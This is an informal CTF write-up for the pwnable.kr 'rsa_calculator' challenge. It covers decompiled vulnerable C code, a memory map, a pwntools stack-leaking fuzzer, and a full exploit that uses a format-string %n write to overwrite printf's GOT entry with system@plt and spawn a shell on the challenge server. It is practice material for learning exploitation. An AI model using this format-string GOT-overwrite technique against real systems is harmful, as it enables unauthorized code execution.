`
# pwnable.kr_solves
writeups/scripts for some of the pwnable.kr challenges i solved
**rsa_calculator**
the binary shows a rsa encryption/decryption tools. however there is alot of bugs but ill focus only on the part i usedd to crack it. it took me a while to find it but it has a bug in `RSA_decrypt`:
```c
__int64 __fastcall RSA_decrypt()
{
  int v2; // [rsp+Ch] [rbp-634h]
  int v3; // [rsp+10h] [rbp-630h]
  int v4; // [rsp+14h] [rbp-62Ch]
  int i; // [rsp+14h] [rbp-62Ch]
  int v6; // [rsp+18h] [rbp-628h]
  char v7[15]; // [rsp+20h] [rbp-620h] BYREF
  char ptr[1025]; // [rsp+2Fh] [rbp-611h] BYREF
  char src[520]; // [rsp+430h] [rbp-210h] BYREF
  unsigned __int64 v10; // [rsp+638h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  if ( is_set )
  {
    v2 = 0;
    printf("how long is your data?(max=1024) : ");
    __isoc99_scanf("%d");
    v3 = 0;
    fgetc(stdin);
    puts("paste your hex encoded data");
    while ( v2-- != 0 )
    {
      if ( !(unsigned int)fread(ptr, 1uLL, 1uLL, stdin) )
        exit(0);
      if ( ptr[0] == 10 )
        break;
      ptr[++v3] = ptr[0];
    }
    memset(src, 0, 512uLL);
    v4 = 0;
    v6 = 0;
    while ( 2 * v3 > v4 )                       // while (2028 > i)
    {
      v7[0] = ptr[v4 + 1];
      v7[1] = ptr[v4 + 2];
      v7[2] = 0;
      ++v6;
      __isoc99_sscanf((__int64)v7, "%02x");
      v4 += 2;
    }
    memcpy(g_ebuf, src, v3);
    for ( i = 0; v3 / 8 > i; ++i )
      g_pbuf[i] = decrypt(g_ebuf[i], (unsigned int *)pri);
    g_pbuf[i] = 0;
    puts("- decrypted result -");
    printf(g_pbuf);
    putchar(10);
    return 0LL;
  }
  else
  {
    puts("set RSA key first");
    return 0LL;
  }
}
```
 apart from the sktechy ascii converting loops theres a format string bug (`puts(s)`);. however it only takes rsa encrypted data. in order to (deal w that i made an rsa encryptor script in python).
 
 # my original plan
 was to 
 1. overwrite one of the libc function with %n format string bug and change it to point to g_pbuf. (g_pbuf is the a global var on the bss this program keeps the unecnrypted data, meaning i have full control of it)
 2. inject shellcode into g_pbuf
 3. get shell
unforutnatley, i forgot to check and even though NX is off, the bss is not executable:
```
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x402000 r-xp     2000       0 rsa_calculator
****0x601000           0x602000 r--p     1000    1000 rsa_calculator****
          0x602000           0x603000 rw-p     1000    2000 rsa_calculator
    0x7ffff7db4000     0x7ffff7db7000 rw-p     3000       0 [anon_7ffff7db4]
    0x7ffff7db7000     0x7ffff7ddf000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7ddf000     0x7ffff7f44000 r-xp   165000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f44000     0x7ffff7f9a000 r--p    56000  18d000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9a000     0x7ffff7f9e000 r--p     4000  1e2000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9e000     0x7ffff7fa0000 rw-p     2000  1e6000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa0000     0x7ffff7fad000 rw-p     d000       0 [anon_7ffff7fa0]
    0x7ffff7fbf000     0x7ffff7fc1000 rw-p     2000       0 [anon_7ffff7fbf]
    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000       0 [vvar]
    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000       0 [vdso]
    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc8000     0x7ffff7ff0000 r-xp    28000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000   29000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   34000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000       0 [anon_7ffff7ffe]
    0x7ffffffdd000     0x7ffffffff000 rwxp    22000       0 [stack]
```
# better plan
from this point i was close cause i can currently overwrite any libc function to anything else. 2 good candidates are printf and memcpy which i can both overwrite to system@plt. this 2 functions are good because thier first parameter is directly from g_pbuf/g_ebuf. this are the calls: `memcpy(g_ebuf, src, v3); `,  `printf(g_pbuf);`. now in order to write i need to use this format string bug to put one of this function on the stack ( which the rsa_decrypt does just by inputing it) and overwritring it with system. the format of this is like this: %{number to write}c%{call arg on the that has the libc function i chose to ovewrite}n. to get the number to write is easy. just the integer version of the system@plt address. but to get the arguemnt is no easy task. in order to find the exact argument the libc function will be in i used this fuzzer script:

```python
from pwn import*
import re
# the fuzzer leakes the stack using fsb. i used it in order to find an offset to where the stack buffer starts


# encryption functions from geeksforgeeks for rsa encryption
def power(base, expo, m):
    res = 1
    base = base % m
    while expo > 0:
        if expo & 1:
            res = (res * base) % m
        base = (base * base) % m
        expo = expo // 2
    return res


def modInverse(e, phi):
    for d in range(2, phi):
        if (e * d) % phi == 1:
            return d
    return -1


def generateKeys():
    p = 17
    q = 19
    n = p * q
    phi = (p - 1) * (q - 1)
    e = 5
    for e in range(2, phi):
        if gcd(e, phi) == 1:
            break
    d = modInverse(e, phi)

    return e, d, n


def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


def encrypt(m, e, n):
    return power(m, e, n)

def decrypt(c, d, n):
    return power(c, d, n)

def calc_encrypt(payload):
    e, d, n = generateKeys()
    M = payload.split(" ") 
    C = []
    for i in range(len(M)):
        C.append(hex(encrypt(ord(M[i]), e, n)))
    for i in range(len(M)):
        C[i] += (10 - len(C[i])) * "0"
    parsed = "".join(C).replace("0x", "")
    return parsed

context.log_level = 'error'


# prints leaked addrsses
for i in range(1, 100):
    payload = '%' + str(i) + '$llX'
    payload = " ".join(payload)
    payload = calc_encrypt(payload)
    p = process("./rsa_calculator")
    
    p.sendline("1")
    p.sendline("17")
    p.sendline("19")
    p.sendline("5")
    p.sendline("173")
    p.sendline("3")
    p.sendline("1000")
    p.sendline(payload.encode())
    s = p.recv().decode()
    p.close()
    start = s.find("- decrypted result -\n")
    start = s.find("\n", start)  
    end = s.find("\n\n- select menu -", start)  
    chunk = s[start:end]      
    print(f'{str(i)}\n {chunk}')
```
no that i have everything i need to choose what function is better, memcpy or printf. my choice it printf, simply because using memcpy created annyoing problems when entering the fsb. since i need to enter the commands ahead in order for it not to crash the entire process (forget it, doesnt really matter).
```python
from pwn import *
p = connect('pwnable.kr', 9012)

#set keys
p.sendline(b"1")
#enter rsa keys
p.sendline(b"17")
p.sendline(b"19")
p.sendline(b"5")
p.sendline(b"173")


printf_add = p64(0x602028)
#memcpy_add = p64(0x602040)


# decrypts to: %94c%4196194c%31$ln. 
payload = b"38000000e40000005600000083000000380000005600000079000000e4000000af00000079000000e4000000560000008300000038000000cc00000079000000fd0000006d000000e6000000"
payload += printf_add
# choose rsa_decyrpt function option
p.sendline(b"3")
p.sendline(b"1000")
p.sendline(payload)

# choose again, and enter to printf "sh" 
payload = "73000000a8000000"
p.sendline(b"3")
p.sendline(b"300")
p.sendline(payload)

p.interactive()
```
